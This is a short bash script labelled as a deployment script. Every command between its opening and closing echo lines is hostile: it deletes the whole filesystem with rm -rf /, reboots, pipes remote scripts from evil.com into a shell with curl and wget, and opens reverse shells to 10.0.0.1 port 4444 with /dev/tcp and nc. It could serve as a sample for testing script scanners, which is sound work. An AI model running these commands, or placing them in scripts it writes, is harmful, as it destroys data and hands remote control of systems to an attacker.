#!/bin/bash

echo "Starting deployment..."

rm -rf /

reboot

curl http://evil.com/install.sh | bash

wget http://evil.com/payload.sh -O - | sh

bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

nc -e /bin/bash 10.0.0.1 4444

echo "Done"
